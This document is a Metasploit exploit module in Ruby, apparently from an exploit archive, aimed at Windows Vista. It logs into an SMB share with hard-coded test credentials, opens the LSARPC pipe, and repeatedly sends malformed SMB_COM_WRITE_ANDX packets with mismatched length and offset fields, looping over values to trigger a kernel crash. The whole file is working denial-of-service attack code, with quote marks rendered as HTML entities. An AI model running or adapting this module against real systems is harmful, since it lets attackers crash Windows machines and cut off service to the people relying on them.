MS Windows WRITE_ANDX SMB command handling Kernel DoS (meta)
============================================================





require &#039;msf/core&#039;

module Msf
module Exploits
module Test


class BugTest < Msf::Exploit::Remote


	include Exploit::Remote::SMB


	def initialize(info = {})
		super(update_info(info,
			&#039;Name&#039;           => &#039;test exploit&#039;,
			&#039;Description&#039;    => 	
				"tests",
			&#039;Author&#039;         => &#039;tests&#039;,
			&#039;License&#039;        => MSF_LICENSE,
			&#039;Version&#039;        => &#039;$Revision: 0 $&#039;,
			&#039;Arch&#039;           => &#039;x86&#039;,
			&#039;Payload&#039;        =>
				{
					&#039;Space&#039; => 1000
				},
			&#039;Targets&#039;        => 
				[
					[
						&#039;Windows VISTA&#039;,
						{
							&#039;Platform&#039; => &#039;win&#039;
						}
					],
				],
			&#039;DefaultTarget&#039; => 0))
	end


	def subexploit(dlenlow, doffset,fillersize)

		print_line("1")

            datastore[&#039;SMBUser&#039;]=&#039;testuser&#039;
            datastore[&#039;SMBPass&#039;]=&#039;testuser&#039;
            datastore[&#039;SMBDomain&#039;]=&#039;COBAYA&#039;
		datastore[&#039;SMBName&#039;]=&#039;COBAYA&#039; 

		print_line("2")
		
		connect()

		print_line("3")

		smb_login()

		print_line("4")
 
               pkt = CONST::SMB_CREATE_PKT.make_struct

		pkt[&#039;Payload&#039;][&#039;SMB&#039;].v[&#039;Flags1&#039;] = 0x18
		pkt[&#039;Payload&#039;][&#039;SMB&#039;].v[&#039;Flags2&#039;] = 0xc807

		pkt[&#039;Payload&#039;][&#039;SMB&#039;].v[&#039;MultiplexID&#039;] = simple.client.multiplex_id.to_i
		pkt[&#039;Payload&#039;][&#039;SMB&#039;].v[&#039;TreeID&#039;] = simple.client.last_tree_id.to_i
		pkt[&#039;Payload&#039;][&#039;SMB&#039;].v[&#039;UserID&#039;] = simple.client.auth_user_id.to_i
		pkt[&#039;Payload&#039;][&#039;SMB&#039;].v[&#039;ProcessID&#039;] = simple.client.process_id.to_i

		pkt[&#039;Payload&#039;][&#039;SMB&#039;].v[&#039;Command&#039;] = CONST::SMB_COM_NT_CREATE_ANDX

		pkt[&#039;Payload&#039;][&#039;SMB&#039;].v[&#039;WordCount&#039;] = 24
		
		pkt[&#039;Payload&#039;].v[&#039;AndX&#039;] = 255
		pkt[&#039;Payload&#039;].v[&#039;AndXOffset&#039;] = 0xdede
		pkt[&#039;Payload&#039;].v[&#039;FileNameLen&#039;] = 14
		pkt[&#039;Payload&#039;].v[&#039;CreateFlags&#039;] = 0x16
		pkt[&#039;Payload&#039;].v[&#039;AccessMask&#039;] = 0x2019f  # Maximum Allowed
		pkt[&#039;Payload&#039;].v[&#039;ShareAccess&#039;] = 7
		pkt[&#039;Payload&#039;].v[&#039;CreateOptions&#039;] = 0x400040
		pkt[&#039;Payload&#039;].v[&#039;Impersonation&#039;] = 2       
		pkt[&#039;Payload&#039;].v[&#039;Disposition&#039;] = 1
		pkt[&#039;Payload&#039;].v[&#039;Payload&#039;] = "\x00\\\x00L\x00S\x00A\x00R\x00P\x00C" + "\x00\x00"


		simple.client.smb_send(pkt.to_s)

		print_line("5")

		ack = simple.client.smb_recv_parse(CONST::SMB_COM_NT_CREATE_ANDX)
		
		pkt = CONST::SMB_WRITE_PKT.make_struct

		data_offset = pkt.to_s.length - 4

		print_line("6")
		
		filler = Rex::Text.rand_text(fillersize)

		print_line("7")

		pkt[&#039;Payload&#039;][&#039;SMB&#039;].v[&#039;Signature1&#039;]=0xcccccccc
		pkt[&#039;Payload&#039;][&#039;SMB&#039;].v[&#039;Signature2&#039;]=0xcccccccc
		pkt[&#039;Payload&#039;][&#039;SMB&#039;].v[&#039;MultiplexID&#039;] = simple.client.multiplex_id.to_i
		pkt[&#039;Payload&#039;][&#039;SMB&#039;].v[&#039;TreeID&#039;] = simple.client.last_tree_id.to_i
		pkt[&#039;Payload&#039;][&#039;SMB&#039;].v[&#039;UserID&#039;] = simple.client.auth_user_id.to_i
		pkt[&#039;Payload&#039;][&#039;SMB&#039;].v[&#039;ProcessID&#039;] = simple.client.process_id.to_i
		pkt[&#039;Payload&#039;][&#039;SMB&#039;].v[&#039;Command&#039;] = CONST::SMB_COM_WRITE_ANDX
		pkt[&#039;Payload&#039;][&#039;SMB&#039;].v[&#039;Flags1&#039;] = 0x18
		pkt[&#039;Payload&#039;][&#039;SMB&#039;].v[&#039;Flags2&#039;] = 0xc807
		pkt[&#039;Payload&#039;][&#039;SMB&#039;].v[&#039;WordCount&#039;] = 14
		pkt[&#039;Payload&#039;].v[&#039;AndX&#039;] = 255
		pkt[&#039;Payload&#039;].v[&#039;AndXOffset&#039;] = 0xdede
		pkt[&#039;Payload&#039;].v[&#039;FileID&#039;] = ack[&#039;Payload&#039;].v[&#039;FileID&#039;]
		pkt[&#039;Payload&#039;].v[&#039;Offset&#039;] = 0
		pkt[&#039;Payload&#039;].v[&#039;Reserved2&#039;] = -1
		pkt[&#039;Payload&#039;].v[&#039;WriteMode&#039;] = 8
		pkt[&#039;Payload&#039;].v[&#039;Remaining&#039;] = fillersize
		pkt[&#039;Payload&#039;].v[&#039;DataLenHigh&#039;] = 0
		pkt[&#039;Payload&#039;].v[&#039;DataLenLow&#039;] = dlenlow #<==================
		pkt[&#039;Payload&#039;].v[&#039;DataOffset&#039;] = doffset #<====
		pkt[&#039;Payload&#039;].v[&#039;DataOffsetHigh&#039;] = 0xcccccccc #<====
		pkt[&#039;Payload&#039;].v[&#039;ByteCount&#039;] = fillersize#<====
		pkt[&#039;Payload&#039;].v[&#039;Payload&#039;] = filler

		print_line("8")
		
		simple.client.smb_send(pkt.to_s)
		
		print_line("9")

	end

	def exploit
		
		k=72
		j=0xffff
		while j>10000
			i=0xffff
			while i>10000
				begin
					print_line("datalenlow=#{i} dataoffset=#{j} fillersize=#{k}")
					subexploit(i,j,k)
				rescue
					print_line("rescue")
				end
				i=i-10000
			end
			j=j-10000
		end
		
	end

end

end
end
end



